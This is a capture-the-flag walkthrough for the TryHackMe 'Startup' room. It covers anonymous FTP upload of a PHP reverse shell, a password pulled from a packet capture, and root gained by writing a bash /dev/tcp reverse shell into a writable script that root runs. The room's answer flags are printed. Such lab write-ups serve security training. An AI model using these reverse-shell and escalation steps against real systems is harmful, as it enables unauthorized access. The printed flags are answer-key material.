# TryHackMe Startup Walkthrough
<img src="Screenshots/Room Icon.png" width="10%" height="10%">  

Description: Abuse traditional vulnerabilities via untraditional means.  
Author: Sooi Vervloessem  
Link: https://tryhackme.com/room/startup

## Task 1: What is the secret spicy soup recipe?
We start by performing an NMAP scan on the target machine:  
```bash
$ nmap -A -p- <your_ip>
```
<img src="Screenshots/1 Nmap Scan.png" width="50%" height="50%">  

We can see that there are 3 ports open, port 21, 22 and port 80.  

### FTP Login
Let's start by trying to access the FTP share. 
We're able to login using the 'anonymous' user, which has no password set.  
We download the files present to our host system so we can view them:  
<img src="Screenshots/2 ftp login as anonymous.png" width="50%" height="50%">  

Trying to open the important.jpg results in the following error:  
<img src="Screenshots/3 Opening image gives error.png" width="50%" height="50%">  

After some investigation, it became clear that this file is actually a .png, not a .jpg.  
Modifying the file extension to '.png' allowed me to open it:  
```bash
$ mv important.jpg important.png
$ xdg-open important.png
```
<img src="Screenshots/4 See notice.txt and fix image.png" width="50%" height="50%">  

I checked the image for hidden information but couldn't find anything. I decided to move on to the HTTP service running on port 80.

### Web Enumeration + PHP reverse shell
On the HTTP website running, nothing interesting was really there, so I decided to run a subdirectory search using Gobuster:  
```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<your_ip>
```
<img src="Screenshots/5 Gobuster results discovered files subdir.png" width="50%" height="50%">  

We can see the /files folder has been discovered, let's visit it:  
<img src="Screenshots/6 files subfolder looks like FTP share.png" width="50%" height="50%">  

The contents of this directory are the same as our FTP share contents. Let's verify this using a test.txt file upload to the FTP share:  
```bash
$ touch test.txt
$ ftp <your_ip>
```
Next we upload the file by running:  
```bash
ftp> put test.txt
```
<img src="Screenshots/7 FTP rights for uploading files to folder.png" width="50%" height="50%">  

Let's verify that our test.txt file is now also present on the /files/ftp subdirectory:  
<img src="Screenshots/8 Proof FTP rights for uploading files to folder.png" width="50%" height="50%">  
Our test.txt file is present!  
This gave me an idea to upload a PHP reverse shell to access the system. Let's create one:  
<img src="Screenshots/9 Create reverse PHP shell.png" width="50%" height="50%">  

Now let's upload the reverse shell to our FTP share:  
```bash
ftp> put shell.php
```
<img src="Screenshots/10 Upload reverse shell to FTP folder.png" width="50%" height="50%">  

Next, we need to start a listener on our host system by running the following command (make sure the port is the same as configured for the reverse shell):  
```bash
$ nc -lvnp <your_host_system_port>
```
<img src="Screenshots/11 Start listener on reverse shell port.png" width="50%" height="50%">  

Now, we can trigger the reverse shell by accessing 'http://<your_ip>/files/ftp/shell.php':  
<img src="Screenshots/12 Browse to shell.php.png" width="50%" height="50%">  
<img src="Screenshots/13 Reverse shell as www-data.png" width="50%" height="50%">  
We see that our listener received a connection. We now have a reverse shell as the www-data user.
I like to stabalize the reverse shell by running the following command:  
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
<img src="Screenshots/14 Stabalize shell.png" width="50%" height="50%">  

Upon exploring the root directory, I found the recipe.txt, which contains our answer to Task 1:  
<img src="Screenshots/15 Found answer 1 recipe.txt.png" width="50%" height="50%">  
**Answer #1: love**


## Task 2: What are the contents of user.txt?
Also in the root directory of the system, I found an interesting folder called 'incidents', which contained the 'suspicious.pcapng' file:  
<img src="Screenshots/16 Suspicious pcapng discovered.png" width="50%" height="50%">  
Let's download it to our host system for review. We start a python http.server in the directory of the pcapng file, so we can download it on our host system:  
```bash
$ python3 -m http.server 8080
```
<img src="Screenshots/17 Start Python http server.png" width="50%" height="50%">  

Now we download the file on our host system and open it using Wireshark:  
```bash
$ wget <your_ip>:8080/suspicious.pcapng
$ wireshark suspicious.pcapng
```
<img src="Screenshots/18 Download suspicious.pcapng.png" width="50%" height="50%">  
<img src="Screenshots/19 Open pcapng with wireshark.png" width="50%" height="50%">  

Upon investigating the different TCP Streams, I found a password in tcp.stream 7. The password appears to be for the "lennie" user:  
<img src="Screenshots/20 Found a password potentially for lennie.png" width="50%" height="50%">  

I tried SSH'ing to the machine as lennie user, with the discovered password, and it worked!  
```bash
$ ssh lennie@<your_ip>
```
<img src="Screenshots/21 SSH login as lennie user and find user.txt.png" width="50%" height="50%">  

The home directory of lennie contained the user.txt flag.  
**Answer #2: THM{03ce3d619b80ccbfb3b7fc81e46c0e79}**


## Task 3: What are the contents of root.txt?
Before we continue, let's stabalize our SSH shell(optional) and discover the home directory of lennie:  
<img src="Screenshots/22 Stabalize SSH shell and discover scripts directory.png" width="50%" height="50%">  
We see an interesting folder called "scripts" containing a bash script and a text file. Let's take a look at its contents:  
<img src="Screenshots/23 Discover script.png" width="50%" height="50%">  
It appears that the 'planner.sh' script writes an environment variable to the startup_list.txt file (in our case still empty).  
Next, it calls the '/etc/print.sh' script which just prints the "Done!" message.  
I decided to check the file permissions of all files to see if something interesting could be found:  
<img src="Screenshots/25 File permissions scripts and print script.png" width="50%" height="50%">  
We notice that the '/etc/print.sh' file is writable by our user(lennie).  
We also notice that the planner.sh is owned by root. This gave me the hypothesis that a root job/service was periodically running the planner.sh script.  
  
The fact that we're allowed to modify the '/etc/print.sh' script, and that this script is called inside the 'planner.sh' script, gave me the idea of inserting a bash reverse shell:  
<img src="Screenshots/26 Create reverse bash shell.png" width="50%" height="50%">  
We modify the '/etc/print.sh' file so it contains our reverse bash shell:  
```bash
#!/bin/bash
sh -i >& /dev/tcp/<your_host_system_ip>/<your_host_system_port> 0>&1
```
<img src="Screenshots/27 Modify print.sh script with reverse shell.png" width="50%" height="50%">  

We then setup a listener on our host system by running:  
```bash
$ nc -lvnp <your_host_system_port>
```
After waiting a little while, we received a connection as the root user. Finally, we can read the root.txt flag and solve this TryHackMe Challenge:  
<img src="Screenshots/28 Setup listener + receive root.txt flag.png" width="50%" height="50%">  
**Answer #3: THM{f963aaa6a430f210222158ae15c3d76d}**


## Conclusion
I had a ton of fun pwning this TryHackMe Box. I hope you enjoyed this TryHackMe Walkthrough!  
If you want to reach out, check my socials on my [Github Page](https://github.com/sooivervloessem)